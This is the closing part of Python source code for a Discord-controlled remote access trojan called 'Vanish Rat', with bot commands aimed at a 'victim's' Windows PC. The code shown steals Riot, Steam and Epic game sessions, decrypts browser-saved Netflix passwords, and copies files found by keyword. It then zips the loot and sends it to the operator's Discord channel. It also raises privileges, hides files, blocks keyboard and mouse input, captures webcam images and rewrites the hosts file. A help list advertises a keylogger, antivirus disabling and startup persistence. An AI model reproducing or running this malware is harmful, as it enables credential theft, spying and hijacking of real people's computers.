                                continue
            if os.path.exists(valorant_config_dir):
                for file in os.listdir(valorant_config_dir):
                    file_path = os.path.join(valorant_config_dir, file)
                    if os.path.isfile(file_path):
                        try:
                            shutil.copy2(file_path, os.path.join(temp_dir, file))
                            session_collected = True
                        except Exception:
                            continue
            riot_settings_files = [
                os.path.join(riot_base, "riot_client_settings.yaml"),
                os.path.join(program_data_riot, "riot_client_settings.yaml")
            ]
            for settings_path in riot_settings_files:
                if os.path.isfile(settings_path):
                    try:
                        shutil.copy2(settings_path, os.path.join(temp_dir, "riot_client_settings.yaml"))
                        session_collected = True
                    except Exception:
                        continue
            if not session_collected:
                await ctx.send("No Riot session data found.")
                return
            zip_path = os.path.join(tempfile.gettempdir(), "Riot_Grabber.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(temp_dir):
                    for file in files:
                        zipf.write(os.path.join(root, file), arcname=file)
            await ctx.send(file=discord.File(zip_path))
            os.remove(zip_path)
    except Exception as e:
        await ctx.send(f"Error extracting Riot session: {str(e)}")

# steam stealer
@bot.command()
async def steam(ctx):
    try:
        steam_path = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam")
        if not os.path.exists(steam_path):
            await ctx.send("Steam not found.")
            return
        with tempfile.TemporaryDirectory() as temp_dir:
            session_collected = False
            for file in os.listdir(steam_path):
                if file.startswith("ssfn"):
                    shutil.copy2(os.path.join(steam_path, file), os.path.join(temp_dir, file))
                    session_collected = True
            config_files = ["config/config.vdf", "config/loginusers.vdf"]
            for file in config_files:
                file_path = os.path.join(steam_path, file)
                if os.path.exists(file_path):
                    shutil.copy2(file_path, os.path.join(temp_dir, os.path.basename(file)))
                    session_collected = True
            if not session_collected:
                await ctx.send("No session data found.")
                return
            zip_path = os.path.join(tempfile.gettempdir(), "Steam_Grabber.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(temp_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, arcname=file)
            await ctx.send(file=discord.File(zip_path))
            os.remove(zip_path)
    except Exception as e:
        await ctx.send(f"Error extracting Steam session: {e}")

# Epic Stealer
@bot.command()
async def epic(ctx):
    try:
        base_path = os.path.join(os.getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved", "Config")
        log_path = os.path.join(os.getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved", "Logs")
        if not os.path.exists(base_path) and not os.path.exists(log_path):
            await ctx.send("Data not found.")
            return
        with tempfile.TemporaryDirectory() as temp_dir:
            session_collected = False
            if os.path.exists(base_path):
                for file in os.listdir(base_path):
                    src_file = os.path.join(base_path, file)
                    if os.path.isfile(src_file):
                        with open(src_file, "rb") as fsrc, open(os.path.join(temp_dir, file), "wb") as fdst:
                            fdst.write(fsrc.read())
                            session_collected = True
            if os.path.exists(log_path):
                for file in os.listdir(log_path):
                    src_file = os.path.join(log_path, file)
                    if os.path.isfile(src_file):
                        with open(src_file, "rb") as fsrc, open(os.path.join(temp_dir, f"log_{file}"), "wb") as fdst:
                            fdst.write(fsrc.read())
                            session_collected = True

            if not session_collected:
                await ctx.send("No data found.")
                return
            zip_path = os.path.join(tempfile.gettempdir(), "Epic_Grabber.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(temp_dir):
                    for file in files:
                        zipf.write(os.path.join(root, file), arcname=file)
            await ctx.send(file=discord.File(zip_path))
            os.remove(zip_path)
    except Exception as e:
        await ctx.send(f"Error extracting Epic session: {str(e)}")

# Search Files
@bot.command()
async def sf(ctx, *, keyword: str):
    try:
        await ctx.send(f"Searching for: `{keyword}`. This may take a while.")

        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        found_files = []
        for drive in drives:
            for root, dirs, files in os.walk(drive):
                for file in files:
                    if keyword.lower() in file.lower():
                        found_files.append(os.path.join(root, file))
                        if len(found_files) >= 10:
                            break
                if len(found_files) >= 10:
                    break
        if not found_files:
            await ctx.send("No matching files found.")
            return
        with tempfile.TemporaryDirectory() as temp_dir:
            for file_path in found_files:
                try:
                    shutil.copy2(file_path, os.path.join(temp_dir, os.path.basename(file_path)))
                except Exception:
                    continue
            zip_path = os.path.join(tempfile.gettempdir(), "File_Stealer.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(temp_dir):
                    for file in files:
                        zipf.write(os.path.join(root, file), arcname=file)
            await ctx.send(file=discord.File(zip_path))
            os.remove(zip_path)
    except Exception as e:
        await ctx.send(f"Search failed: {str(e)}")

# Ask For Admin
@bot.command()
async def admin(ctx):
    try:
        script = os.path.abspath(sys.argv[0])
        subprocess.run(['powershell', 'Start-Process', 'python', f'"{script}"', '-Verb', 'runAs'], shell=True)
        await ctx.send("Running Admin")
    except Exception as e:
        await ctx.send(f"Failed")

# Hides File
def jam(file_path):
    try:
        subprocess.call(f'attrib +h +s "{file_path}"', shell=True)
        print(f"File hidden {file_path}")
    except Exception as e:
        print(f"Failed {e}")

# Nexflix Grabber
@bot.command(name="net")
async def netflix_grabber(ctx):
    try:
        loot = []
        profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Guest Profile"]
        browser_paths = [
            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
            os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Opera Software", "Opera Stable"),
            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
        ]
        for browser in browser_paths:
            for profile in profiles:
                state_path = os.path.join(browser, "Local State")
                login_db = os.path.join(browser, profile, "Login Data")

                if not os.path.exists(state_path) or not os.path.exists(login_db):
                    continue
                try:
                    with open(state_path, "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    key_data = base64.b64decode(local_state.get("os_crypt", {}).get("encrypted_key", ""))
                    if key_data and key_data.startswith(b"DPAPI"):
                        key = win32crypt.CryptUnprotectData(key_data[5:], None, None, None, 0)[1]
                    else:
                        continue
                    temp_db = os.path.join(tempfile.gettempdir(), f"LoginData_{profile.replace(' ', '_')}")
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                    for url, user, pwd in cursor.fetchall():
                        if "netflix.com" in url:
                            try:
                                decrypted_password = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
                                loot.append((user, decrypted_password))
                            except Exception:
                                continue
                    conn.close()
                    os.remove(temp_db)
                except Exception:
                    continue
        app_paths = [
            os.path.join(os.getenv("LOCALAPPDATA"), "Packages", "4DF9E0F8.Netflix_mcm4njqhnhss8", "LocalState"),
            os.path.join(os.getenv("APPDATA"), "Netflix")
        ]
        for app_path in app_paths:
            for root, dirs, files in os.walk(app_path):
                for file in files:
                    if file.endswith(".json") or file.endswith(".txt"):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read()
                                if "netflix" in content.lower() and "@" in content:
                                    loot.append(("Possible Data", content[:500])) 
                        except Exception:
                            continue
        if loot:
            embed = discord.Embed(
                title="Netflix Credentials",
                description="Saved Netflix credentials",
                color=0xE50914
            )
            for user, pwd in loot:
                embed.add_field(name="Email or Data", value=f"`{user}`", inline=True)
                embed.add_field(name="Password or Snippet", value=f"`{pwd}`", inline=True)
            await ctx.send(embed=embed)
        else:
            await ctx.send("Info Not Found")
    except Exception as e:
        await ctx.send(f"Netflix grab failed: {e}")

# Disable Kbm From User
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
@bot.command()
async def disableinput(ctx):
    try:
        if not is_admin():
            await ctx.send("This command requires administrator privileges.")
            return
        success = ctypes.windll.user32.BlockInput(True)
        if success:
            await ctx.send("Input has been disabled.")
        else:
            await ctx.send("Failed")
    except Exception as e:
        await ctx.send(f"{e}")

# Enable Kbm For User        
@bot.command()
async def enableinput(ctx):
    try:
        success = ctypes.windll.user32.BlockInput(False)
        if success:
            await ctx.send("Input has been renabled.")
        else:
            await ctx.send("Failed")
    except Exception as e:
        await ctx.send(f"{e}")

# Spam Webcam Images
@bot.command()
async def spamwebcam(ctx):
    await ctx.send("How many webcam images should I take? (1-10)")
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.isdigit()
    try:
        msg = await bot.wait_for('message', timeout=20, check=check)
        count = int(msg.content)
        if not (1 <= count <= 100):
            return await ctx.send("Please enter a number between 1 and 10")
        await ctx.send(f"Starting..")
        import threading, cv2, os, time
        def capture_loop():
            temp = os.getenv("TEMP")
            for i in range(count):
                cam = cv2.VideoCapture(0)
                ret, frame = cam.read()
                if ret:
                    filename = f"camloop_{i+1}.png"
                    path = os.path.join(temp, filename)
                    cv2.imwrite(path, frame)
                    cam.release()
                    cv2.destroyAllWindows()
                    try:
                        bot.loop.create_task(ctx.send(file=discord.File(path)))
                        time.sleep(0.2) 
                        os.remove(path)
                    except:
                        pass
                time.sleep(1)
        threading.Thread(target=capture_loop, daemon=True).start()
    except Exception as e:
        await ctx.send(f"Failed{e}")

# Sock Scan 
@bot.command()
async def sock(ctx):
    """Scans common local proxy ports to detect open SOCKS proxies."""
    import socket
    common_ports = {
        1080: "SOCKS5 (Tor/Proxychains)",
        9050: "Tor SOCKS",
        9051: "Tor Control",
        8080: "HTTP Proxy",
        3128: "Squid Proxy",
        8000: "Alternate HTTP",
        8888: "Generic Proxy",
        1081: "SOCKS Alt"
    }
    found = []
    for port, label in common_ports.items():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex(("127.0.0.1", port))
        if result == 0:
            found.append(f"Port {port} open ({label})")
        else:
            found.append(f"Port {port} closed")
        s.close()
    scan_report = "\n".join(found)
    await ctx.send(f"**Local Proxy Scan Results:**\n```ini\n{scan_report}\n```")

# List Users Drives 
@bot.command()
async def drives(ctx):
    """Lists all drives and free space."""
    try:
        import psutil
        drives = psutil.disk_partitions()
        report = ""
        for d in drives:
            usage = psutil.disk_usage(d.mountpoint)
            report += f"[{d.device}] {usage.percent}% used – {usage.free // (1024 ** 3)}GB free\n"
        await ctx.send(f"```ini\n{report}```")
    except Exception as e:
        await ctx.send(f"Failed to list drives: {e}")

# List Usb devices
@bot.command()
async def usb(ctx):
    """Lists recently connected USB devices."""
    try:
        output = subprocess.check_output("wmic path Win32_USBHub get DeviceID,Description", shell=True, text=True)
        await ctx.send(f"```yaml\n{output[:1900]}\n```")
    except Exception as e:
        await ctx.send(f"{e}")

# Network Scan (reverse shell hunting)
@bot.command()
async def netstat(ctx):
    """Lists current active network connections."""
    try:
        result = subprocess.check_output("netstat -ano", shell=True, text=True)
        await ctx.send(f"```diff\n{result[:1900]}```")
    except Exception as e:
        await ctx.send(f"Netstat failed: {e}")

# Type On Users Pc 
@bot.command()
async def type(ctx, *, payload: str):
    """Types any text on the victims keyboard"""
    try:
        import pyautogui
        await ctx.send(f"Typing `{payload}`")
        pyautogui.write(payload, interval=0.05)  
        await ctx.send("Done.")
    except Exception as e:
        await ctx.send(f"{e}")

# Block Website 
@bot.command()
async def block(ctx, url: str):
    """Blocks a domain via hosts file."""
    try:
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        backup_path = hosts_path + ".bak"
        url = url.strip().lower().replace("https://", "").replace("http://", "").split("/")[0]
        domains = [url]
        if not url.startswith("www."):
            domains.append("www." + url)
        with open(hosts_path, "r", encoding="utf-8") as f:
            lines = f.readlines()
        if not os.path.exists(backup_path):
            shutil.copy(hosts_path, backup_path)
        lines = [line for line in lines if not any(domain in line for domain in domains)]
        for domain in domains:
            lines.append(f"127.0.0.1 {domain}\n")
        with open(hosts_path, "w", encoding="utf-8") as f:
            f.writelines(lines)
        await ctx.send(f"Blocked `{url}`.")
    except PermissionError:
        await ctx.send("No permission:(")
    except Exception as e:
        await ctx.send(f"`{e}`")

# Mute Mutes All System Audio
@bot.command()
async def mute(ctx):
    """Mutes audio."""
    try:
        from ctypes import POINTER, cast
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        import comtypes
        comtypes.CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMute(1, None)
        await ctx.send("System muted.")
    except Exception as e:
        await ctx.send(f"{e}")

# Unmute Audio
@bot.command()
async def unmute(ctx):
    """Unmutes audio."""
    try:
        from ctypes import POINTER, cast
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        import comtypes
        comtypes.CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMute(0, None)  # 0 = unmute
        await ctx.send("System unmuted.")
    except Exception as e:
        await ctx.send(f"{e}")

# Troll Commands 
@bot.command(name="troll")
async def troll_commands(ctx):
    embed = discord.Embed(
        title="Troll Commands",
        description=f"",
        color=0xff66cc
    )
    embed.add_field(name=".ssp", value="Spams Spotify", inline=False)
    embed.add_field(name=".web", value="Spams Broswer", inline=False)
    embed.add_field(name=".cap", value="Spams Cap Lock key", inline=False)
    embed.add_field(name=".rr", value="Rick Roll Victim", inline=False)
    await ctx.send(embed=embed)

# Rat Commands
@bot.command(name="help")
async def custom_help(ctx):
    rat_txt = """    DISCORD RAT COMMANDS
   ==========================
.info           – System info From Victim
.geo            – IP & Geo From Victim
.admin          - Ask For Admin
.key start/stop – Start or stop keylogger
.sock           - Sock Scan For Proxies
.drives         - List Users Drives
.usb            - List Users Usb Devices
.netstat        - Scan Networks (Reverse shell hunting)
.dwd            – Disable Windows Defender
.rtp            – Disable Real Time Protection
.kill           – Kill "process" 
.disableinput   - Turns off Users Kbm
.enableinput    - Turns On Users Kbm
.disablemgr     - Disables Task Manager
.enablemgr      – Enables Task Manager
.open (url)  – Open Link in browser
.block (url)    - Block Site Via Host file
.up             – Upload a file To Victims Pc 
.df             – Delete Uploaded File
.qr             – Connects to wifi via qr
.record         – Screen record Victims Pc 
.ss             – Screenshot Victims Pc
.type           - Type On Users Pc
.webcam         – Take webcam photo
.spamwebcam     - Spams Webcam Images
.sf (File Name) - File Stealer         - 
.af             - Steals Auto Fill
.pw             – Browser Passwords
.gc             – Grab Browser Cookies
.net            – Netflix Info Grabber
.epic           - Epic Games Grabber
.steam          – Steam Grabber
.riot           – Riot Grabber
.token          – Discord token grabber
.reg            – Add to Startup(Registry)
.rmreg          – Remove from Startup(Registry)
.wifi           - Wifi Info Grabber
.cb             - Clipboard Grabber
.sp             – Spotify token grabber
.mute           - Mute Victims Audio
.unmute         - Unmute Victims Audio
.v <0–100>      - Set system volume
.shell <cmd>    – Run Cmd/Shell Commands
.list           – Running processes From Victim
.history        – Browser history From Victim
.Mic            – Record Victims microphone
.speak "msg"    - Uses TTS To Say Custom Msgs
.msg "msg"      – Message Victim Via Msg Box
.stup           – Add to startup (Task)
.clearstup      – Remove from startup (Task)
.dl             – Grab download history
.wp             – Set wallpaper To Victims Pc
.gwp            – Grab Victims Wallpaper
.moff           – Turn off monitor
.mon            – Turn on monitor
.shutdown       – Shutdown PC
.crash          – Crash Victims Pc 
.restart        – Restart PC
.sd             – Self Delete Incase Of Emergency
.troll          – Open troll Commands
.exit           – Kill Rat
==========================

- Made by @deadconvicss
- Github - https://github.com/deadconvicess/Vanish-Rat
"""
    await send_command_list(ctx, "Rat Commands.txt", rat_txt)

# Starting bot
def Vanish_Rat():
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"Bot error: {e}")

# End
if __name__ == "__main__":
    if Vm_1():
        sys.exit(0)
    dirrrrr()
    svchost()
    threading.Thread(target=Vanish_Rat, daemon=True).start()  
    while True:
        time.sleep(1)
     
